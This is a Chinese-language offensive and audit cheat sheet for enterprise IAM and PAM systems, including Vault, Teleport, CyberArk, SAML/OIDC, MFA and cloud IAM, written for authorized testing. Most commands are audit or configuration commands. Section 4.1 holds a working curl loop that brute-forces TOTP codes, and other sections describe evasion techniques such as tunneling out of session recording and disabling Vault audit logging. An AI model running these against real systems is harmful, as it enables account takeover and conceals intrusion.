# 企业 IAM / PAM 运维·审计·绕过速查（进攻视角）

> 范围：IdP/SSO/MFA 配置弱点、PAM（Vault/CyberArk/Teleport）默认面与 JIT 绕过、身份生命周期回收、云 IAM 策略审计。
> 不覆盖：AD 域攻击链（Kerberoasting/ADCS/委派/横向/接管）——见本库 `windows-ad-pentest`、`active-directory`、`account-takeover-chain`、`object-matrix-authz`；本文只保留 AD 的**审计侧**命令。
> 命令标注：无标注 = 上游原样或已对照官方文档核对；`（未验证）` = 未核对具体语法，照敲前先 `--help`。
> 凭据从环境变量/保险库注入（`export VAULT_TOKEN=...`），不写进命令行参数与历史记录。仅限授权范围。

## 1. HashiCorp Vault：部署 / JIT / 动态凭据 / 租约

### 1.1 服务端与初始化（上游原样）
```bash
wget https://releases.hashicorp.com/vault/1.16.0/vault_1.16.0_linux_amd64.zip && unzip vault_1.16.0_linux_amd64.zip && sudo mv vault /usr/local/bin/
cat > /etc/vault/config.hcl << 'EOF'
storage "raft" { path = "/opt/vault/data" node_id = "node1" }
listener "tcp" { address = "0.0.0.0:8200" tls_disable = false tls_cert_file = "/etc/vault/certs/cert.pem" tls_key_file = "/etc/vault/certs/key.pem" }
api_addr = "https://vault.company.com:8200"
cluster_addr = "https://vault.company.com:8201"
seal "awskms" { region = "us-east-1" kms_key_id = "alias/vault-unseal" }
EOF
vault server -config=/etc/vault/config.hcl
vault operator init -key-shares=5 -key-threshold=3        # 仅首次；5 份 unseal key 就地分片保管
vault operator unseal <key1> && vault operator unseal <key2> && vault operator unseal <key3>
vault status && vault operator raft list-peers
export VAULT_ADDR='https://vault.company.com:8200' VAULT_CACERT=/etc/vault/certs/cert.pem
```
攻击/审计点：① `vault server -dev` = 内存存储、无 seal、root token 直打 stdout；② 未 auto-unseal → 重启即 sealed（可用性面）；③ `curl -s $VAULT_ADDR/v1/sys/health` 匿名可读集群状态（sealed/standby）；④ `sys/audit` 为空时 JIT 取凭据无日志（见 1.5）。

### 1.2 认证方法（JIT 入口）与枚举
```bash
vault auth list -detailed                      # 已启用方法/路径/TTL/描述（低权 token 可读）
vault auth enable userpass                     # 注意：Vault 自身无失败锁定
vault auth enable approle                      # 机器身份（CI/CD 常用，弱面最多）
vault write auth/approle/role/app1 token_policies="app1-ro" token_ttl=1h token_max_ttl=4h secret_id_ttl=24h secret_id_num_uses=5
vault read auth/approle/role/app1/role-id && vault write -f auth/approle/role/app1/secret-id
vault write auth/approle/login role_id=<role-id> secret_id=<secret-id>    # 换 token
vault auth enable -path=oidc oidc
vault write auth/oidc/config -<<'EOF'
{ "oidc_discovery_url": "https://idp.company.com", "oidc_client_id": "vault", "oidc_client_secret": "<secret>", "default_role": "reader" }
EOF
vault auth enable ldap && vault write auth/ldap/config url="ldaps://dc.company.com" userdn="ou=users,dc=company,dc=com" binddn="cn=vault,ou=svc,dc=company,dc=com" bindpass="<pw>" userattr="sAMAccountName"
```
绕过/审计点：① `secret_id_ttl=0` + `secret_id_num_uses=0` = 永久凭据；② 未设 `token_max_ttl` 时可无限续租；③ AppRole `role_id` 常硬编码在 CI 变量/镜像里，只靠 secret_id 保护；④ OIDC role 的 `bound_claims`/`allowed_redirect_uris` 为空或 `*` → 任意 IdP 用户可换 token；⑤ `vault token capabilities <token> <path>` 用来自证"我有哪些权限"。

### 1.3 策略 HCL 与最小权限核验
```hcl
# jit-db-readonly.hcl —— JIT：只允许按需读动态凭据 + 续租，不含长期 static 读
path "database/creds/readonly" { capabilities = ["read"] }
path "sys/leases/renew"        { capabilities = ["update"] }
path "sys/leases/lookup/*"     { capabilities = ["read","list"] }
```
```bash
vault policy write jit-db-readonly jit-db-readonly.hcl && vault policy list && vault policy read jit-db-readonly
vault token lookup <token>                                  # policies / ttl / renewable / num_uses && vault token capabilities <token> database/creds/readonly
vault list -format=json sys/policies/acl | jq -r '.[]' | while read -r p; do vault policy read "$p" | grep -qE 'path\s+"\*"|"\*"' && echo "WILDCARD: $p"; done
vault read sys/mounts && vault kv metadata get secret/db/prod    # kv-v1 无版本历史；metadata 确认旧值可否回滚读
```

### 1.4 动态凭据（JIT 核心，也是滥用点）
```bash
vault secrets enable database                   # 上游写作 `vault mount database`（旧别名，仍可用）
vault write database/config/prod-db plugin_name=mysql-database-plugin connection_url="{{username}}:{{password}}@tcp(db.company.com:3306)/" allowed_roles="readonly" username="vault_admin" password="<pw>"
vault write database/roles/readonly db_name=prod-db creation_statements="CREATE USER '{{name}}'@'%' IDENTIFIED BY '{{password}}';GRANT SELECT ON *.* TO '{{name}}'@'%';" default_ttl="1h" max_ttl="24h"
vault read database/creds/readonly              # 每次调用生成一次性账号
vault secrets enable aws && vault write aws/config/root access_key=<ak> secret_key=<sk> region=us-east-1   # AWS STS 动态凭据，不落静态 AK/SK
vault write aws/roles/deploy credential_type=assumed_role policy_document=-<<'EOF'
{ "Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"s3:GetObject","Resource":"arn:aws:s3:::app/*"}] }
EOF
vault read aws/creds/deploy
vault secrets enable -path=ssh-client-signer ssh && vault write ssh-client-signer/config/ca generate_signing_key=true   # SSH 一次性证书
vault write ssh-client-signer/roles/ops -<<'EOF'
{ "key_type":"ca","allowed_users":"*","default_user":"ops","ttl":"30m" }
EOF
vault write -f ssh-client-signer/sign/ops public_key=@$HOME/.ssh/id_rsa.pub ; vault secrets enable pki && vault write pki/root/generate/internal common_name=corp.internal ttl=87600h
```
滥用/审计点：① `max_ttl` 过长（24h+）配合 `vault lease renew -increment=24h` 把一次性凭据变长期；② `creation_statements` 含 `GRANT ALL`，或 `{{name}}` 被直接拼接（插件未用 prepared statement）→ SQL 注入式提权；③ SSH role `allowed_users="*"` = 任意用户登录任意主机，等于绕开 PAM；④ 审计设备为空则以上调用全无痕迹。

### 1.5 租约与吊销（爆炸半径）
```bash
vault list sys/leases/lookup/                          # 顶层；认证租约在 sys/leases/lookup/auth/<mount>
vault list sys/leases/lookup/database/creds/readonly/ && vault lease lookup database/creds/readonly/<lease-id>   # ttl / issue_time / renewable
vault lease renew -increment=1h database/creds/readonly/<lease-id> && vault lease revoke -prefix database/creds/readonly     # 事故响应：批量吊销该角色全部凭据
vault token revoke -accessor <accessor>                # 按 accessor 踢会话（不需明文 token）; vault read sys/leases/count   # 租约总量（未验证），用于发现凭据爆炸
vault audit list -detailed && vault audit enable file file_path=/var/log/vault_audit.log && vault audit enable syslog tag=vault
```
审计点：审计日志 JSON 若含未脱敏 request data（或 `log_raw=true`）会把凭据写盘；持 root 者可 `vault audit disable file` 关审计后取数（反取证）→ **审计设备变更本身必须单独告警**。

## 2. PAM（CyberArk / Teleport）能力清单与检查点

CyberArk 五大模块与检查点：**Vault**（凭证加密存储）→ 未纳管的 break-glass/本地 admin = 绕过口，check 能否直读口令；**PSM**（特权会话管理：RDP/SSH/WinRM/Psql/MySQL 录屏+命令文本+危险命令实时阻断）→ 直连目标 IP/端口不走 PSM 即无录制，本地 `Administrators`、服务账号、DB 直连是三大盲区；**CPM**（自动轮换）→ 未配置轮换的平台、轮换失败静默、轮换窗口内新旧口令并存；**AIM**（应用身份）→ 应用内嵌静态凭据、Credential Provider 配置可读后滥用；**PTA**（特权威胁分析）→ 依赖日志源齐全度，无 PTA 则特权行为无告警。
上游策略基线（原样）：复杂性大小写+数字+特殊字符；长度 20–30；轮换 root 30 天 / 服务账号 90 天；禁重复前 5 次；检出后立即轮换。
CyberArk 实操走 PVWA Web 与私有 `PACLI`——本卡不收未核对的具体 PACLI 语法，现场以 `pacli` 帮助为准。
```bash
tsh login --proxy=teleport.company.com:443 --user alice
tsh ls && tsh ssh ops@db-01 && tsh scp ./dump.sql ops@db-01:/tmp/ && tsh ssh -L 5432:localhost:5432 ops@db-01   # 端口转发：把行为移出录制的最常用手法
tsh status && tsh apps ls && tsh kube ls
tsh request create --roles=production-access --reason "P1 #4821"    # JIT 申请（上限受 max_session_ttl 约束）
tsh request ls && tsh request review --approve <request-id>
tsh login --request-roles=production-access --request-reason "P1 #4821" && tsh play <session-id>   # 会话回放（取证）
tctl users add alice --roles=access,editor && tctl tokens add --type=node && tctl status && tctl get roles
```
Teleport 审计点：① role 的 `node_labels=*` 且 `logins` 含 `root` → 全域 root；② `max_session_ttl` 数十小时 = JIT 名存实亡；③ `session_recording` 为 `off`/仅 proxy 且不落第三方存储 → 先登录再起隧道即脱离录制；④ `tsh request review --approve` 是否自审（requester = approver）；⑤ `tbot`/join token 泄露 = 节点入场券。

## 3. SAML 2.0 / OIDC：关键断言字段与常见错误配置

| SAML 字段 | 必须校验 | 缺失/错误后果 |
|:---|:---|:---|
| `<Signature>`（Response 或 Assertion） | 用 IdP 证书验签，且**验的必须是即将被消费的那个节点** | 只验 Response 不验 Assertion → 断言替换（XSW）冒充任意用户 |
| `<Issuer>` | 等于预期 IdP entityID | 接受任意 IdP 签发的断言 |
| `<Subject><NameID>` + `Format` | Format 白名单（persistent/emailAddress）+ 值不可预测 | 可猜/可改的 NameID（用户名、邮箱）→ 直接冒充 |
| `<Conditions NotBefore/NotOnOrAfter>` | 时钟窗口收窄（≤ 数分钟） | 断言长期可重放 |
| `<AudienceRestriction><Audience>` | 严格等于本 SP entityID | A 应用断言重放到 B 应用 |
| `<SubjectConfirmationData Recipient/InResponseTo/NotOnOrAfter>` | Recipient=ACS URL；InResponseTo=本会话 AuthnRequest ID | IdP-initiated 任意重放、CSRF 式登录 |
| `<AuthnStatement SessionNotOnOrAfter>`；`<AttributeStatement>` role/group/mail | 会话寿命上限；属性白名单 + 归属校验 | MFA 只挡首次、会话长期有效；属性注入 `role=admin` 直接提权 |

```bash
echo "$SAMLResponse" | base64 -d | xmllint --format - | less ; openssl x509 -in idp.crt -noout -fingerprint -sha256 -dates -subject -issuer   # 解开断言 + 与 SP 配置的 IdP 证书指纹逐一比对
xmlsec1 --verify --pubkey-cert-pem idp.crt --id-attr:ID Assertion response.xml  # 本地验签（id-attr 写法随版本/断言结构变化，未验证）
curl -s https://idp.company.com/app/metadata | xmllint --format -       # IdP 元数据：绑定方式/证书/ACS
```
```bash
curl -s https://idp.company.com/.well-known/openid-configuration | jq '{issuer,authorization_endpoint,token_endpoint,jwks_uri,id_token_signing_alg_values_supported,code_challenge_methods_supported,token_endpoint_auth_methods_supported}'
curl -s https://idp.company.com/.well-known/jwks.json | jq '.keys[] | {kid,kty,alg,use,n,e}'
python3 -c "import base64,json,sys;t=sys.stdin.read().strip().split('.')[1];print(json.dumps(json.loads(base64.urlsafe_b64decode(t+'='*(-len(t)%4))),indent=2,ensure_ascii=False))" < id_token.txt
```
OIDC 错误配置 → 可打点：① `id_token_signing_alg_values_supported` 含 `none`，或同时含 RS256/HS256（alg 混淆：拿 RS256 公钥当 HMAC 密钥）；② `aud`/`azp` 不校验 → 跨客户端重放，`nonce` 不校验 → id_token 重放，缺 `at_hash`/`c_hash`；③ 无 `S256` 或客户端不强推 PKCE → 授权码截获后直接兑换；④ `redirect_uri` 前缀/通配匹配 → 开重定向换码；⑤ `jku`/`x5u`/`kid` 由 token header 决定且未白名单 → 自带 JWKS 签名；⑥ JWKS 轮换/已撤销密钥仍被接受。

## 4. MFA 弱面：无速率限制 / 推送轰炸 / 降级

### 4.1 TOTP 无速率限制（首要检查项）
6 位码空间 10^6、30s 窗口；登录接口无锁定/无验证码/无 IP 限速时在线爆破在算力上可行。
```bash
# 抓包拿到完整登录请求（字段名按目标改）后跑；滤掉常规失败码，留非预期响应
for c in $(seq -w 0 999999); do curl -s -o /dev/null -w "$c %{http_code}\n" -X POST "$MFA_VERIFY_URL" -H "Cookie: $SESSION" -H 'Content-Type: application/x-www-form-urlencoded' --data "otp=$c"; done | grep -vE ' (400|401|403|422)$' | head
# 限速探测：同错码连打 50 次，看有无 429/锁定/延迟增长
for i in $(seq 1 50); do curl -s -o /dev/null -w "%{http_code} %{time_total}\n" -X POST "$MFA_VERIFY_URL" -H "Cookie: $SESSION" --data "otp=000000"; done | sort | uniq -c
kcadm.sh update realms/myrealm -s 'otpPolicyType=totp'        # 上游原样：Keycloak OTP 策略
kcadm.sh update realms/myrealm -s 'otpPolicyDigits=6' && kcadm.sh update realms/myrealm -s 'otpPolicyPeriod=30'
kcadm.sh get realms/myrealm | jq '{bruteForceProtected,failureFactor,maxFailureWaitSeconds,permanentLockout,otpPolicyLookAheadWindow}'   # false = OTP 与口令同池、无限制
```
### 4.2 推送轰炸（MFA fatigue）
判定：同用户 approve/deny 与登录尝试时间高度聚集、跨多 IP/UA、失败-成功交替。
```bash
az rest --method get --uri "https://graph.microsoft.com/v1.0/auditLogs/signIns?\$top=100"   # 看 authenticationDetails 中 succeeded=false 骤增与 status.errorCode
curl -s -H "Authorization: SSWS $TOK" "https://<org>.okta.com/api/v1/logs?limit=200" | jq '.[] | select(.eventType|test("mfa|push"))'   # filter 表达式未验证
```
缓解对照（缺一即可炸）：number matching / 附加上下文（设备+地点）/ 禁止弱方法回退。
### 4.3 降级与旁路面清单
① 备用通道：邮件验证码、SMS、语音（可劫持/可换绑）；② 应用专用密码与 legacy basic auth（IMAP/POP/SMTP/EWS）；③ 条件访问的**排除组**（break-glass、宽屏服务账号）是否被扩大；④ 被授予 password 凭据的应用（服务账号交互登录不受 MFA 约束）；⑤ 另一套未下线 IdP、应用自带账号表、残留 `old.company.com`；⑥ 设备码流与 OAuth 同意钓鱼（device code + illicit consent）绕 MFA 拿 token；⑦ "记住此设备 30 天"持久 cookie 被窃；⑧ SAML/OIDC 的 `NameID`/`sub` 与 MFA 状态不绑定，自助改邮箱后重建会话。
```bash
az rest --method get --uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" | jq '.value[] | {displayName,state,excludeUsers:.conditions.users.excludeUsers,excludeGroups:.conditions.users.excludeGroups,grant:.grantControls.builtInControls}'
az rest --method get --uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/namedLocations"   # 受信任 IP 段过宽 = 打进去就免 MFA
az rest --method get --uri "https://graph.microsoft.com/v1.0/policies/authenticationMethodsPolicy"        # 是否仍允许短信/语音/邮件 OTP（未验证）
```

## 5. 身份生命周期（入职/离职/权限回收）审计
```powershell
Search-ADAccount -AccountInactive -TimeSpan 90.00:00:00 -UsersOnly | Select-Object Name,LastLogonDate
Search-ADAccount -AccountDisabled -UsersOnly
Get-ADUser -Filter {Enabled -eq $true} -Properties LastLogonDate,PasswordLastSet | Where-Object {$_.LastLogonDate -lt (Get-Date).AddDays(-90)} | Select SamAccountName,LastLogonDate,PasswordLastSet
Get-ADGroupMember -Identity "Domain Admins" | Select Name,SamAccountName
Get-ADUser -Filter * -Properties ServicePrincipalNames | Where-Object {$_.ServicePrincipalNames}     # 遗留 SPN
net accounts ; Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624,4625} -MaxEvents 50 | Select TimeCreated,Id
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -Operations UserLoggedIn -ResultSize 100     # Purview（需 E3/E5）
```
```bash
aws iam generate-credential-report && sleep 5 && aws iam get-credential-report --query Content --output text | base64 -d | column -s, -t | head
aws iam list-users | jq -r '.Users[] | select(.PasswordLastUsed == null) | .UserName'
aws iam list-access-keys --query 'AccessKeyMetadata[?Status==`Active`].{U:UserName,K:AccessKeyId,C:CreateDate}' --output table
aws iam get-account-summary | jq '.SummaryMap.AccountMFAEnabled,.SummaryMap.Users' ; aws iam get-account-password-policy
gcloud iam service-accounts list && gcloud iam service-accounts keys list --iam-account=<sa>@<proj>.iam.gserviceaccount.com --managed-by=user
gcloud projects get-iam-policy <project> --flatten="bindings[].members" --filter="bindings.role:roles/owner OR bindings.role:roles/editor" --format=table
az role assignment list --all --include-inherited -o table ; az ad user list --query "[?accountEnabled==\`false\`].userPrincipalName" -o tsv ; az ad app credential list --id <appId> -o table
az rest --method get --uri "https://graph.microsoft.com/v1.0/auditLogs/directoryAudits?\$top=100" | jq '.value[]|{activityDisplayName,result,initiatedBy}'
kcadm.sh get users -r myrealm --query 'max=2000' | jq -r '.[] | select(.enabled==false or .emailVerified==false) | .username' ; kcadm.sh get users/<user-id>/sessions -r myrealm   # 离职后是否仍有活跃会话
```
回收清单：IdP 禁用 ≠ 应用停权（下游本地账号/SCIM 未同步需逐一验）；遗留 API key、OAuth refresh token、GCP 用户托管密钥、服务账号密钥、VPN/设备证书、SSO 会话 cookie、PAM 保险库内的个人特权账号；除 `LastLogonDate` 外必须查**服务端会话**（短 JWT vs 长期 refresh）。

## 6. AD 域审计命令（攻击链见本库其它卡）
```bat
PingCastle.exe --healthcheck --server dc.company.com --level Full    :: 上游原样；建议加 --privileged 取更深数据
PingCastle.exe --carto && PingCastle.exe --hc-conso --xmls C:\Reports   :: 信任/网段拓扑；历史报告汇总对比
PingCastle.exe --scanner aclcheck --server dc.company.com && PingCastle.exe --scanner localadmin --server dc.company.com && PingCastle.exe --scanner nullsession --server dc.company.com   :: ACL 异常 / 本地管理员复用 / 空会话
PingCastle.exe --scanner spooler --server dc.company.com
PurpleKnightCmd.exe --domain corp.company.com                        :: 上游原样（参数以现场 help 为准）
```
```bash
SharpHound.exe -c All -d corp.company.com                            # 上游原样：采集后导入图库做路径查询
```
```powershell
auditpol /set /subcategory:"Account Logon" /success:enable /failure:enable            # 上游原样（AD 审计策略落地）
auditpol /set /subcategory:"Logon" /success:enable /failure:enable && auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Changes" /success:enable
Get-ObjectAcl -DistinguishedName "dc=corp,dc=company" -ResolveGUIDs | Where-Object {$_.ObjectAceType -eq "DS-Replication-Get-Changes"}   # 需 PowerView：只读枚举复制权限持有者
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "Write"}
```

## 7. 云 IAM 策略审计
```bash
aws sts get-caller-identity
# 本地托管策略里的 Action=*/Resource=*（提权面）
for p in $(aws iam list-policies --scope Local --query 'Policies[].Arn' --output text); do v=$(aws iam get-policy --policy-arn "$p" --query 'Policy.DefaultVersionId' --output text); aws iam get-policy-version --policy-arn "$p" --version-id "$v" --query 'PolicyVersion.Document' | jq -r --arg p "$p" 'select(.Statement[]? | (.Action=="*" and .Resource=="*")) | $p'; done
aws iam list-entities-for-policy --policy-arn <arn>                  # 谁在继承
aws iam get-role --role-name <role> --query 'Role.AssumeRolePolicyDocument'   # 无 Condition 的信任策略 = 任人扮演
aws iam list-saml-providers && aws iam list-open-id-connect-providers
aws iam simulate-principal-policy --policy-source-arn <arn> --action-names s3:GetObject --resource-arns "*"
aws accessanalyzer create-analyzer --analyzer-name console-analyzer --type ACCOUNT && aws accessanalyzer list-analyzers
aws accessanalyzer list-findings --analyzer-arn <analyzer-arn>       # 上游写 --analyzer-name，实为 --analyzer-arn（已更正）
gcloud projects get-iam-policy <project> --format=json > policy.json ; gcloud projects get-iam-policy <project> --flatten="bindings[].members" --filter="bindings.role:roles/owner" --format=table
gcloud asset search-all-iam-policies --scope=organizations/<org-id> --query="policy:roles/owner"    # 需 Cloud Asset API 权限
az role assignment list --all --include-inherited -o table ; az role definition list --custom-role-only true -o table ; az ad sp list --all --query "[].{appId:appId,name:displayName}" -o table
```
检查点：① 信任策略缺 `Condition`（`sts:ExternalId` / `sub` / `aud` 限定）→ 跨账号或任意 OIDC 主体可扮演；② 自定义角色含 `*`；③ 长期 AK/SK 与用户托管 GCP 密钥未清零；④ `iam:PassRole` + 可改代码的服务 = 提权到任意角色；⑤ 组织级 Owner 数量、`roles/iam.serviceAccountTokenCreator`（可伪造任意 SA 身份）。

## 8. 快速自查表
1. IdP 是否只剩一套（旧 IdP/本地账号表已下线）？2. MFA 是否强制且无弱方法回退？3. TOTP 接口是否有速率限制/锁定？4. 条件访问排除组是否有 owner 与时效？5. NameID/sub 是否可预测、可自助更改？6. SAML 是否验签 Assertion（不只 Response）并校验 Audience/Recipient？7. OIDC 是否校验 aud/nonce 且禁 `none`/HS256 混淆？8. Vault/Teleport 是否存在 `secret_id_ttl=0`、`node_labels=*`、`max_ttl` 超长？9. PAM 是否覆盖全部特权路径（本地 admin、DB 直连、kubeconfig）？10. 离职流程是否覆盖 refresh token/API key/设备证书/会话？

## 9. 参考文件
- `zerotrust-ztna-microseg.md`：ZTNA/身份感知代理/微隔离与东西向盲区。
- 本库：`windows-ad-pentest`、`active-directory`、`account-takeover-chain`、`object-matrix-authz`、`jwt-attacks`、`oauth-oidc-flow`、`2fa-otp-bypass`。
- 上游：`32-身份访问管理-IAM/*`、`36-零信任架构-ZeroTrust/*`、`34-API安全-APISecurity/API认证与授权安全`（吸收/丢弃明细见 REPORT.md）。
